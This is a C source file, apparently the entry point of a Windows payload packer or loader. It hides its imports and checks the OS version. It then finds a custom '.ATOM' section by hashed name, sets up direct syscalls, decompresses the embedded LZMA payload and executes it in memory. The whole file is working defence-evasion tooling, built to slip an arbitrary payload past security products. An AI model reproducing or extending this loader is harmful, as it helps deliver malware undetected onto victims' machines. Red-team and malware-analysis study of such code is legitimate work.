/*
	ORCA (@ORCx41) : The Program's EP 
*/

#include <Windows.h>

#include "Debug.h"
#include "Utils.h"
#include "IatCamouflage.h"
#include "easylzma.h"

#pragma comment (lib, "easylzma_s.lib")
#pragma comment (lib, "Syscalls.lib")

#pragma comment(linker,"/ENTRY:main")
#pragma warning( disable : 4996)




int main() {

#if _WIN64								
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32							
	PPEB pPeb = (PPEB)(__readfsdword(0x30));
#else									
	PPEB pPeb = NULL;
#endif

	CamouflageImports(0xFF);

	if (pPeb == NULL || (pPeb != NULL && pPeb->OSMajorVersion != 0xA)) {
		return -1;
	}
	
	unsigned int	iError = ELZMA_E_OK;
	unsigned char*	_OutputUnpackedData = NULL;
	size_t			_OutputUnpackedSize = NULL;

	CHAR* pBaseAddress = (CHAR*)pPeb->ImageBaseAddress;
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddress;
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBaseAddress + pImgDosHdr->e_lfanew);
	PIMAGE_SECTION_HEADER pImgSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdr) + sizeof(IMAGE_NT_HEADERS));
	PVOID  pData = NULL;
	SIZE_T sSize = NULL;
	for (size_t i = 0; i <= pImgNtHdr->FileHeader.NumberOfSections; i++) {
		if (ATOM_StrHashed == HASH(pImgSectionHdr->Name)) {
			pData = (PVOID)((ULONG_PTR)pBaseAddress + pImgSectionHdr->VirtualAddress);
			sSize = pImgSectionHdr->SizeOfRawData;
			break;
		}
		pImgSectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)pImgSectionHdr + (DWORD)sizeof(IMAGE_SECTION_HEADER));
	}

	if (pData == NULL || sSize == NULL) {
#ifdef DEBUG
		PRINT(L"[!] Could Not Find .ATOM Section ! (main:56)\n");
#endif // DEBUG
		return -1;
	}

#ifdef DEBUG
	PRINT(L"[i] .ATOM Section Data : 0x%p\n", pData);
	PRINT(L"[i] .ATOM Section Size : %d \n",   sSize);
#endif // DEBUG


	if (!InitializeDirectNtCalls()) {
#ifdef DEBUG
		PRINT(L"[!] Failed To Initialize Direct Syscalls Struct (main.c:69)\n");
#endif // DEBUG
		return -1;
	}
	

	if ((iError = simpleDecompress(ELZMA_lzma, pData, sSize, &_OutputUnpackedData, &_OutputUnpackedSize)) != ELZMA_E_OK) {
#ifdef DEBUG
		PRINT(L"[!] Failed To Decompress Data (main:77) %d \n", iError);
#endif // DEBUG
		return -1;
	}


#ifdef DEBUG
	PRINT(L"[+] Decompressed Data Output : 0x%p \n", _OutputUnpackedData);
	PRINT(L"[+] Decompressed Size Output : %d \n",  _OutputUnpackedSize);
#endif // DEBUG


	UnpackAndRunEp(_OutputUnpackedData, _OutputUnpackedSize, TRUE);

	return 0;
}

